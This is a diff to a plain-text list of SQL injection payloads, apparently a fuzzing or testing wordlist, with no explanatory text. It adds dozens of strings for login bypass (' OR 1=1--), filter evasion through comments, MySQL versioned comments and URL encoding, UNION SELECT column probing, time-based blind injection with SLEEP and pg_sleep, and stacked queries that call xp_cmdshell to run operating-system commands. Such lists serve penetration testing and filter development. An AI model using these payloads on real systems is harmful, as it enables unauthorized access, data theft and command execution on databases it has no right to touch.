@@ -1,7 +1,50 @@
-' OR/**/1=1--
+' OR 1=1--
+'-- OR 1=1
+'/**/OR/**/1=1--
+'/*!OR*/1=1--
+'/*!50000OR*/1=1--
+'#OR 1=1
+'--+OR 1=1
+'-- -OR 1=1
+'---OR 1=1
+'----OR 1=1
+' OR 1=1-- -
+' OR 1=1--+
+'-- -
 '--+
-'/**/OR/**/'1'='1
-' OR 1=1;--
-' OR 1=1%00--
-' OR 1/**/=/**/1--
-' or 1=1 limit 1 --
+'--
+'#
+'/**/'OR/**/'1'='1
+'/**/'OR'1'='1'--
+'/**/UNION/**/SELECT/**/NULL--
+'/**/UNION/**/SELECT/**/NULL/**/--
+'/**/UNION/**/SELECT/**/1,2,3--
+'/**/AND/**/SLEEP(5)--
+'/*!*/OR/*!*/1=1--
+'/*!50000*/OR/*!50000*/1=1--
+'/*!50000UNION*//*!50000SELECT*/NULL--
+'/*!32302UNION*//*!32302SELECT*/NULL--
+'/*!40100UNION*//*!40100SELECT*/NULL--
+'||1--
+'||1=1--
+'||'1'='1
+'||1=1#
+'||1=1/*
+'||pg_sleep(5)--
+'||SLEEP(5)--
+'||1||(SELECT SLEEP(5))=1--
+'; EXEC xp_cmdshell('id');--
+'; EXEC sp_executesql(N'SELECT 1');--
+'; EXEC master..xp_cmdshell('id');--
+'+UNION+SELECT+NULL--
+'+UNION+SELECT+1,2,3--
+'+AND+1=1--
+'+AND+1=2--
+'+OR+1=1--
+'+SLEEP(5)--
+'%20UNION%20SELECT%20NULL--
+'%20OR%201=1--
+'%20AND%20SLEEP(5)--
+'%09UNION%09SELECT%09NULL--
+'%09OR%091=1--
+'%09AND%09SLEEP(5)--
